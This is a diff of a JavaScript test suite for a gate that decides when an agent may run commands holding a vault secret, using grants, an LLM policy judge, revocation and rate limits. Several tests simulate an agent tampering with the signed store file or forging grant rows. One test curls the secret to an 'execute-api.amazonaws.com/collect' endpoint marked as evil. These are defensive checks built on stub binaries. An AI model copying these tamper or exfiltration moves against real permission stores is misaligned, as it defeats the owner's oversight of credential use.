@@ -135,13 +135,13 @@ console.log('② THE VERDICT — membership is the model\'s; hosts and the end a
 // every run without a standing approval draws its card), the paste door, a fake `curl` in a read-only folder ──
 const BIN = path.join(ROOT, 'bin');
 fs.mkdirSync(BIN, { recursive: true });
-fs.writeFileSync(path.join(BIN, 'curl'), `#!/usr/bin/env node\nprocess.stdout.write('curl got ' + process.env.T + ' for ' + process.argv.slice(2).join(' ') + '\\n');\n`, { mode: 0o555 });
+for (const t of ['curl', 'aws', 'wget', 'gcloud']) fs.writeFileSync(path.join(BIN, t), `#!/usr/bin/env node\nprocess.stdout.write('${t} got ' + process.env.T + ' for ' + process.argv.slice(2).join(' ') + '\\n');\n`, { mode: 0o555 });   // round 3: `aws` too, for the tool-scoped-wildcard leg (㉑)
 fs.chmodSync(BIN, 0o555);   // read-only: the door's programWritable is false (an «Always» / a grant is possible)
 process.on('exit', () => { try { fs.chmodSync(BIN, 0o755); fs.rmSync(ROOT, { recursive: true, force: true }); } catch { } });
 const VALUE = ['unifi', 'admin', 'value', crypto.randomBytes(6).toString('hex')].join('-');
 const LABEL = 'UniFi UCG-Fiber admin (192.168.1.1)';
 let worldN = 0;
-async function world({ instance = 'cluster', groups = new Map(), setting = {}, doorMod = DOOR, ugMod = UG, engineMod = VE, judge = null, judgeOn = () => false } = {}) {
+async function world({ instance = 'cluster', groups = new Map(), setting = {}, doorMod = DOOR, ugMod = UG, engineMod = VE, judge = null, judgeOn = () => false, now = () => Date.now() } = {}) {
   const dir = path.join(ROOT, 'w' + (++worldN)); const dataDir = path.join(dir, 'data'), work = path.join(dir, 'work'), runRoot = path.join(dir, 'run');
   for (const d of [dataDir, work, runRoot]) fs.mkdirSync(d, { recursive: true });
   const frames = [];
@@ -153,7 +153,7 @@ async function world({ instance = 'cluster', groups = new Map(), setting = {}, d
   const useGrants = ugMod.create({ grants: () => grants, vault, log: (m) => logs.push(String(m)) });
   const sources = { secrets: () => VC.secretSource({ vault }) };
   const facts = (caller) => ({ conversationKeys: [caller.conversationId], groupIds: groups.get(caller.conversationId) || [] });
-  const mk = (mod = doorMod) => mod.create({ dataDir, vault, userTodos, sources, instanceKind: () => instance, runRoot: () => runRoot, home: os.homedir(), agentEnv: () => ({ ...process.env, PATH: BIN + ':' + process.env.PATH }), killGraceMs: 400, pipeGraceMs: 300, liveOf: () => true, log: (m) => logs.push(String(m)), useGrants, useFacts: facts, policyJudge: judge, policyOn: judgeOn });
+  const mk = (mod = doorMod) => mod.create({ dataDir, vault, userTodos, sources, instanceKind: () => instance, runRoot: () => runRoot, home: os.homedir(), agentEnv: () => ({ ...process.env, PATH: BIN + ':' + process.env.PATH }), killGraceMs: 400, pipeGraceMs: 300, liveOf: () => true, log: (m) => logs.push(String(m)), useGrants, useFacts: facts, policyJudge: judge, policyOn: judgeOn, now });
   const door = mk();
   const stash = [];
   const paste = PD.create({ vault, userTodos, vaultRun: door, useGrants, setting: (k) => setting[k], deliver: { stashFor: (cid, env) => { stash.push({ cid, ...env }); return { stored: true }; } }, log: (m) => logs.push(String(m)) });
@@ -184,6 +184,7 @@ function entryOf(w, { label = LABEL, hosts = [] } = {}) {
   return { name, id: `secrets:${name}#secret`, ref: `vault://secrets/${name}/secret` };
 }
 const CURL = (ref, ...rest) => ['--env', `T=${ref}`, '--', 'curl', ...rest];
+const RUNTOOL = (ref, ...argv) => ['--env', `T=${ref}`, '--', ...argv];   // round 3: a run of an arbitrary tool with the vault ref in env
 const ROW = (w, e) => w.useGrants.rowsOf(e.id)[0] || null;
 const contentsFrames = (w) => w.frames.filter((m) => m && m.type === 'vault-contents');
 
@@ -385,7 +386,7 @@ console.log('⑩ CONTROLS — patched copies, each RED on its leg');
 {
   const M = mutantCopies('vault-use-grants', REPO);
   const DSRC = fs.readFileSync(path.join(REPO, 'src/server/vault-run-door.js'), 'utf8');
-  const cut = "if (!verdict.ok && verdict.ask && spec.refs.length && spec.refs.every((r) => !(d && d.suspended && d.suspended.has(r.id)) && (standing.get(r.id) || {}).ok === true)) {";
+  const cut = "if (!verdict.ok && verdict.ask && !refused && spec.refs.length && spec.refs.every((r) => !(d && d.suspended && d.suspended.has(r.id)) && (standing.get(r.id) || {}).ok === true)) {";
   ok(DSRC.split(cut).length === 2, 'the short-circuit line is there once (the control below patches it)');
   const noShort = M.load('src/server/vault-run-door.js', DSRC.replace(cut, 'if (false) {'), 'noshort');
   const w1 = await world({ doorMod: noShort });
@@ -444,7 +445,7 @@ console.log('⑪ THE POLICY JUDGE (R4, default OFF) — a stub judge, never a ve
   const y = await runAnswered(w, CURL(e.ref, '-sk', 'https://192.168.1.1/api/stat/health'));
   ok(y.r.ok && y.r.by === 'policy' && !y.card && calls.length === 1, 'ON + the judge says yes (0.93) ⇒ it runs with NO card — by: policy', { by: y.r.by, card: !!y.card, calls: calls.length });
   const c0 = calls[0];
-  ok(c0 && Object.keys(c0.parts).join() === DMm.inputPlan('vault-use-policy').variable.map((x) => x.name).join() && c0.parts.command.includes(e.ref) && c0.parts.hosts === '192.168.1.1' && c0.parts.entry === LABEL && c0.o.policy === POLICY && c0.o.memo.id.startsWith('cid-asker-1\n') && !JSON.stringify(c0).includes(VALUE), 'the judge sees THE CARD\'S FACTS (the plan\'s parts: the command with its REFERENCE, the program, the hosts, templates, what it is for, the label) + the policy on the question — never the value', c0 && { parts: c0.parts, o: c0.o });
+  ok(c0 && Object.keys(c0.parts).join() === DMm.inputPlan('vault-use-policy').variable.map((x) => x.name).join() && c0.parts.command.includes(e.ref) && c0.parts.hosts === '192.168.1.1' && c0.parts.entry === LABEL && 'env' in c0.parts && 'folder' in c0.parts && c0.o.policy === POLICY && c0.o.memo === null && !JSON.stringify(c0).includes(VALUE), 'the judge sees THE CARD\'S FACTS (the plan\'s parts: the command with its REFERENCE, the program, the hosts, templates, purpose, label, env + folder) + the policy — never the value; and memo is null (round 3: the door\'s marked store is the sole memo, never the engine\'s)', c0 && { parts: c0.parts, o: c0.o });
   const q = DMm.vaultPolicyQuestion(POLICY);
   ok(DMm.questionError(q) === null && q.type === 'predicate' && q.instructions.includes(`«${POLICY}»`) && DMm.inputPlan('vault-use-policy').wakePath === false, 'its ONE question carries the owner\'s words (a predicate, valid), off the wake path');
   const rl = linesOf(w, 'vault-run').filter((l) => l.outcome === 'ran').pop();
@@ -480,7 +481,7 @@ console.log('⑪ THE POLICY JUDGE (R4, default OFF) — a stub judge, never a ve
   ok(rv.ok && rv.revoked === 1 && recAfter && recAfter.status !== 'open' && !w.door.rowFacts({ id: e.id, store: 'secrets', entry: e.name, field: 'secret' }).use.approved, '「Revoke」 (a click): the approved command\'s pair is revoked, its For-you record closed, the row\'s line gone', rv);
   const n2 = calls.length;
   const again = await runAnswered(w, CURL(e.ref, '-sk', 'https://192.168.1.1/api/stat/health'));
-  ok(again.card && calls.length === n2 && again.card.detail.includes('You revoked the policy judge\'s approval of this command — so this card asks you.'), '… the same command next time: the card (saying it was revoked) — the judge NOT asked', { calls: calls.length - n2, tail: again.card && again.card.detail.split('\n').slice(-1) });
+  ok(again.card && calls.length === n2 && again.card.detail.includes('You revoked the policy judge\'s approval of this command shape — so this card asks you.'), '… the same command next time: the card (saying it was revoked) — the judge NOT asked', { calls: calls.length - n2, tail: again.card && again.card.detail.split('\n').slice(-1) });
   const d2 = w.mk();
   const f2 = d2.rowFacts({ id: e.id, store: 'secrets', entry: e.name, field: 'secret' });
   const st = JSON.parse(fs.readFileSync(path.join(w.dataDir, DOOR.STORE_FILE), 'utf8'));
@@ -575,20 +576,23 @@ console.log('⑬ ROUND 2 — OFF suspends every grant (kept, not deleted); ON re
   ok(on2.r.ok && on2.r.by === 'grant', 'ON again ⇒ the grant is restored (by: grant) — it was never deleted', { by: on2.r.by });
 }
 
-console.log('⑭ ROUND 2 — the policy memo is keyed on the EXACT facts, never the coarse shape');
+console.log('⑭ ROUND 2/3 — the policy memo is the door\'s OWN marked store, keyed on the EXACT facts (never the engine, never the coarse shape)');
 {
-  const calls = [];
-  const judge = async (parts, o) => { calls.push(o.memo.id); return { ok: true, answers: [{ name: 'within_policy', probability: 0.95 }] }; };
+  let calls = 0; let sawMemo = 'unset';
+  const judge = async (parts, o) => { calls++; sawMemo = o.memo; return { ok: true, answers: [{ name: 'within_policy', probability: 0.95 }] }; };
   const w = await world({ judge, judgeOn: () => true });
   const e = entryOf(w);
   w.door.setRunnable({ id: e.id, on: true, reauthed: true });
   w.door.setPolicy({ id: e.id, text: 'read-only status calls', reauthed: true });
-  await runAnswered(w, CURL(e.ref, '-X', 'GET', 'https://192.168.1.1/api/stat/health'));
-  await runAnswered(w, CURL(e.ref, '-X', 'GET', 'https://192.168.1.1/api/stat/health'));   // identical
-  await runAnswered(w, CURL(e.ref, '-X', 'DELETE', 'https://192.168.1.1/api/self'));         // a different method + path
-  ok(calls[0] === calls[1], 'an IDENTICAL command ⇒ the SAME memo id (a true cache hit)', [calls[0], calls[1]]);
-  ok(calls[0] !== calls[2], 'a DIFFERENT method / path ⇒ a DIFFERENT memo id ⇒ a fresh judgment (an approved GET never green-lights a DELETE)', [calls[0], calls[2]]);
-  ok(calls.every((id) => /^cid-asker-1\n[0-9a-f]{32}$/.test(id)), 'the memo id = the conversation + a digest of the exact facts (never the shape key)', calls.slice(0, 1));
+  const g1 = await runAnswered(w, CURL(e.ref, '-X', 'GET', 'https://192.168.1.1/api/stat/health'));
+  const g2 = await runAnswered(w, CURL(e.ref, '-X', 'GET', 'https://192.168.1.1/api/stat/health'));   // identical
+  const del = await runAnswered(w, CURL(e.ref, '-X', 'DELETE', 'https://192.168.1.1/api/self'));         // a different method + path
+  ok(sawMemo === null, 'the engine is passed memo:null (round 3: the forged decision-memo.json is never consulted — the door owns the memo)', { sawMemo });
+  ok(g1.r.by === 'policy' && g2.r.by === 'policy' && calls === 2, 'an IDENTICAL command ⇒ a memo HIT in the marked store (judge NOT re-asked: 2 calls for GET + DELETE, not 3)', { by1: g1.r.by, by2: g2.r.by, calls });
+  ok(del.r.by === 'policy' && calls === 2, 'a DIFFERENT method / path ⇒ a FRESH judgment (an approved GET never green-lights a DELETE)', { byDel: del.r.by, calls });
+  const st = JSON.parse(fs.readFileSync(path.join(w.dataDir, DOOR.STORE_FILE), 'utf8'));
+  const shapes = st.policyApproved[e.id].shapes;
+  ok(shapes.length === 2 && shapes.every((s) => /^[0-9a-f]{32}$/.test(s.key) && typeof s.shape === 'string'), 'the marked store holds the two DISTINCT exact-fact keys (GET, DELETE), each with the coarse shape key for its Revoke', shapes.map((s) => s.key.slice(0, 8)));
 }
 
 console.log('⑮ ROUND 2 — the judge\'s approval and its Revoke PERSIST (a restart)');
@@ -608,6 +612,132 @@ console.log('⑮ ROUND 2 — the judge\'s approval and its Revoke PERSIST (a res
   ok(rv.ok && rv.revoked === 1, 'the Revoke WORKS after a restart (it read the approval back from the store)', rv);
   const again = await runAnswered(w, CURL(e.ref, '-X', 'GET', 'https://192.168.1.1/api/stat/health'), { door: d2 });
   ok(again.card && again.card.detail.includes('You revoked'), '… and the same command now draws the card (revoked, keyed on the exact facts)', again.card && again.card.detail.split('\n').slice(-1));
+}
+
+console.log('⑯ ROUND 3 (MAJOR item 2) — >256 approvals never WIPE the marked store (capped at the write); OFF stays OFF');
+{
+  let clock = Date.now();
+  const judge = async () => ({ ok: true, answers: [{ name: 'within_policy', probability: 0.95 }] });
+  const w = await world({ judge, judgeOn: () => true, now: () => clock });
+  const A = entryOf(w, { label: 'A (policy-judged)' }), B = entryOf(w, { label: 'B (granted, OFF)' });
+  w.door.setRunnable({ id: A.id, on: true, reauthed: true });
+  w.door.setPolicy({ id: A.id, text: 'read-only status', reauthed: true });
+  w.door.setRunnable({ id: B.id, on: true, reauthed: true });
+  w.useGrants.addMember(B.id, { kind: 'conversation', key: 'cid-asker-1' }, { hosts: ['192.168.1.1'] });
+  w.door.setRunnable({ id: B.id, on: false });   // B suspended
+  for (let i = 0; i < 300; i++) { clock += 5 * 60e3; await runAnswered(w, CURL(A.ref, '-X', 'GET', `https://192.168.1.1/api/stat/${i}`)); }   // 300 DISTINCT approved commands, 5 min apart (never over 30/hour)
+  const st = JSON.parse(fs.readFileSync(path.join(w.dataDir, DOOR.STORE_FILE), 'utf8'));
+  ok(st.policyApproved[A.id].shapes.length === 256 && st.policyApproved[A.id].n === 300, 'the write caps the shapes list to 256 (drops the oldest); the count is honest (300)', { shapes: st.policyApproved[A.id].shapes.length, n: st.policyApproved[A.id].n });
+  const d2 = w.mk();   // restart
+  const f = d2.rowFacts({ id: A.id, store: 'secrets', entry: A.name, field: 'secret' });
+  ok(f.use && f.use.approved && f.use.approved.n === 300 && !w.logs.some((l) => /its mark does not verify|read as empty|fail closed/.test(l)), 'after a restart the store STILL VERIFIES (no wipe) — the row reads «approved 300×»', { approved: f.use && f.use.approved, refused: w.logs.filter((l) => /mark|empty|fail closed/.test(l)) });
+  const bRun = await runAnswered(w, CURL(B.ref, '-sk', 'https://192.168.1.1/a'), { door: d2 });
+  ok(!bRun.r.ok && bRun.r.by !== 'grant', 'the entry the owner turned OFF is STILL OFF after the restart (never by: grant — round 2\'s wipe brought it back)', { ok: bRun.r.ok, by: bRun.r.by, code: bRun.r.code });
+}
+
+console.log('⑰ ROUND 3 (MAJOR item 2) — a store that fails its mark FAILS CLOSED (grants paused + a For-you row), not «empty»');
+{
+  const w = await world();
+  const e = entryOf(w);
+  w.door.setRunnable({ id: e.id, on: true, reauthed: true });
+  w.useGrants.addMember(e.id, { kind: 'conversation', key: 'cid-asker-1' }, { hosts: ['192.168.1.1'] });
+  const ctl = await runAnswered(w, CURL(e.ref, '-sk', 'https://192.168.1.1/a'));
+  ok(ctl.r.ok && ctl.r.by === 'grant', 'CONTROL: before tampering the grant runs by: grant', { by: ctl.r.by });
+  // TAMPER: an agent (same uid) rewrites the marked store file — its mark no longer verifies
+  const file = path.join(w.dataDir, DOOR.STORE_FILE);
+  const raw = JSON.parse(fs.readFileSync(file, 'utf8'));
+  raw.runnable = [];
+  fs.writeFileSync(file, JSON.stringify(raw));   // body changed, mark left as-is ⇒ will not verify
+  const d2 = w.mk();   // restart reads the tampered file
+  const tRun = await runAnswered(w, CURL(e.ref, '-sk', 'https://192.168.1.1/a'), { door: d2 });
+  ok(!tRun.r.ok && tRun.r.by !== 'grant', 'a tampered store ⇒ FAIL CLOSED: the grant is paused, the run refused (never by: grant)', { ok: tRun.r.ok, by: tRun.r.by, code: tRun.r.code });
+  const notice = (w.userTodos.snapshot().open || []).find((i) => i.action && i.action.type === 'vault-store-refused');
+  ok(notice && /could not be trusted/.test(notice.text), 'the owner is told in a For-you row (not just a log line)', notice && { text: notice.text });
+  const fac = d2.rowFacts({ id: e.id, store: 'secrets', entry: e.name, field: 'secret' });
+  ok(fac.paused === true, 'the Vault window shows the entry paused while the store is refused', { paused: fac.paused });
+  // RECOVERY: an owner write re-marks the store; the grant works again
+  d2.setRunnable({ id: e.id, on: true, reauthed: true });
+  const rec = await runAnswered(w, CURL(e.ref, '-sk', 'https://192.168.1.1/a'), { door: d2 });
+  ok(rec.r.ok && rec.r.by === 'grant', 'an owner re-mark (any owner write) recovers — the grant runs again', { by: rec.r.by });
+}
+
+console.log('⑱ ROUND 3 (MAJOR item 3) — a Revoke is the owner\'s word over the whole SHAPE: every variant draws the card');
+{
+  let calls = 0;
+  const judge = async () => { calls++; return { ok: true, answers: [{ name: 'within_policy', probability: 0.95 }] }; };
+  const w = await world({ judge, judgeOn: () => true });
+  const e = entryOf(w);
+  w.door.setRunnable({ id: e.id, on: true, reauthed: true });
+  w.door.setPolicy({ id: e.id, text: 'read-only status', reauthed: true });
+  const a = await runAnswered(w, CURL(e.ref, '-X', 'GET', 'https://192.168.1.1/api/a'));
+  ok(a.r.by === 'policy', 'GET /api/a ⇒ by: policy', { by: a.r.by });
+  const rv = w.door.revokeApprovals({ id: e.id });
+  ok(rv.ok && rv.revoked >= 1, 'the owner Revokes', rv);
+  const n0 = calls;
+  const variant = await runAnswered(w, CURL(e.ref, '-X', 'GET', 'https://192.168.1.1/api/b'));   // one path byte different
+  ok(variant.card && variant.r.by !== 'policy' && calls === n0, 'a VARIANT of the revoked shape (GET /api/b) ⇒ the card, the judge NOT re-asked (bed2ef1c covered the shape; round 2 narrowed it to exact — restored)', { by: variant.r.by, card: !!variant.card, calls: calls - n0 });
+}
+
+console.log('⑲ ROUND 3 (MAJOR item 6) — a memo is NOTHING without a live judge: the plugin OFF ⇒ the card, even with a marked approval');
+{
+  let on = true;
+  const judge = async () => ({ ok: true, answers: [{ name: 'within_policy', probability: 0.95 }] });
+  const w = await world({ judge, judgeOn: () => on });
+  const e = entryOf(w);
+  w.door.setRunnable({ id: e.id, on: true, reauthed: true });
+  w.door.setPolicy({ id: e.id, text: 'read-only', reauthed: true });
+  const y = await runAnswered(w, CURL(e.ref, '-X', 'GET', 'https://192.168.1.1/api/stat'));
+  ok(y.r.by === 'policy', 'with the judge live, the command is approved and a memo is written', { by: y.r.by });
+  on = false;   // the plugin is turned off (or the key is gone)
+  const off = await runAnswered(w, CURL(e.ref, '-X', 'GET', 'https://192.168.1.1/api/stat'));
+  ok(off.card && off.r.by !== 'policy' && !off.r.ok, 'the IDENTICAL command with the plugin OFF ⇒ the card (the marked memo is not honoured without a live judge — a forged memo cannot run it)', { by: off.r.by, card: !!off.card });
+}
+
+console.log('⑳ ROUND 3 (MAJOR item 6) — the per-hour bound is THIS use\'s own counter; #31 draws the card and names the limit');
+{
+  let calls = 0;
+  const judge = async () => { calls++; return { ok: true, answers: [{ name: 'within_policy', probability: 0.95 }] }; };
+  const w = await world({ judge, judgeOn: () => true });
+  const e = entryOf(w);
+  w.door.setRunnable({ id: e.id, on: true, reauthed: true });
+  w.door.setPolicy({ id: e.id, text: 'read-only status', reauthed: true });
+  let lastOk = null;
+  for (let i = 0; i < 30; i++) lastOk = await runAnswered(w, CURL(e.ref, '-X', 'GET', `https://192.168.1.1/api/stat/${i}`));
+  ok(lastOk.r.by === 'policy' && calls === 30, 'the first 30 distinct commands are judged and run (by: policy)', { by: lastOk.r.by, calls });
+  const over = await runAnswered(w, CURL(e.ref, '-X', 'GET', 'https://192.168.1.1/api/stat/31'));
+  ok(over.card && over.r.by !== 'policy' && calls === 30 && /already approved 30 commands .* in the last hour/.test(over.card.detail) && /Vault window/.test(over.card.detail), 'the 31st ⇒ the card, the judge NOT asked, naming the limit and its door', { calls, tail: over.card && over.card.detail.split('\n').slice(-1) });
+}
+
+console.log('㉑ ROUND 3 (MAJOR item 5) — a grant names its TOOL: a wildcard default is granted to that CLI only');
+{
+  const w = await world();
+  const e = entryOf(w);
+  w.door.setRunnable({ id: e.id, on: true, reauthed: true });   // open for runs so the aws run draws a card that offers «Always»
+  const aws = await runAnswered(w, RUNTOOL(e.ref, 'aws', 's3', 'ls'), { answer: 'always', reauthed: true, ttl: '30d' });
+  ok(aws.r.ok && aws.r.by === 'always', '«Always» on `aws s3 ls` ⇒ a standing grant', { by: aws.r.by, code: aws.r.code });
+  const row = w.useGrants.rowsOf(e.id)[0];
+  ok(row && row.to[0].tool === 'aws' && row.to[0].hosts.join() === '*.amazonaws.com', 'the grant carries {tool: aws, hosts: *.amazonaws.com}', row && row.to[0]);
+  const aws2 = await runAnswered(w, RUNTOOL(e.ref, 'aws', 's3', 'ls', '--region', 'us-east-1'));
+  ok(aws2.r.ok && aws2.r.by === 'grant', 'another `aws` run under the wildcard ⇒ by: grant (its own CLI)', { by: aws2.r.by });
+  const evil = await runAnswered(w, CURL(e.ref, 'https://abc123.execute-api.us-east-1.amazonaws.com/collect'));
+  ok(evil.card && evil.r.by !== 'grant', 'a `curl` to an execute-api.amazonaws.com endpoint ⇒ the CARD (the aws wildcard is not granted to curl — by: grant on be0f025f)', { by: evil.r.by, card: !!evil.card });
+}
+
+console.log('㉒ ROUND 3 (MAJOR item 7) — a vault-use member is MARKED: a row an agent forged into data/grants.json is dropped');
+{
+  const w = await world();
+  const e = entryOf(w);
+  // a LEGIT member (through the ONE writer, stamped) runs by: grant — the control
+  w.useGrants.addMember(e.id, { kind: 'conversation', key: 'cid-asker-1' }, { hosts: ['192.168.1.1'] });
+  const legit = await runAnswered(w, CURL(e.ref, '-sk', 'https://192.168.1.1/a'));
+  ok(legit.r.ok && legit.r.by === 'grant', 'CONTROL: a member written through the ONE writer (mac stamped) runs by: grant', { by: legit.r.by });
+  // a FORGED member: an agent writes straight to the grants store (no mac) for ANOTHER conversation + host
+  const e2 = entryOf(w);
+  w.grants.set('vault-use', e2.id, { to: [{ kind: 'conversation', key: 'cid-forged', hosts: ['10.9.9.9'] }], except: [] }, 'agent');
+  const forged = await runAnswered(w, CURL(e2.ref, '-sk', 'https://10.9.9.9/a'), { caller: w.caller('cid-forged') });
+  ok(!forged.r.ok && forged.r.by !== 'grant', 'a FORGED row (no valid mac) is DROPPED by the reader ⇒ refused (entry_not_runnable / the card), never by: grant (by: grant on be0f025f)', { ok: forged.r.ok, by: forged.r.by, code: forged.r.code });
+  const pub = w.door.rowFacts({ id: e2.id, store: 'secrets', entry: e2.name, field: 'secret' });
+  ok(!(pub.use && pub.use.to && pub.use.to.length), 'the Vault window shows NO forged member (publicFor drops it too)', pub.use && pub.use.to);
 }
 
 console.log(fail ? `\n${pass} passed, ${fail} failed` : `\nALL PASS (${pass})`);
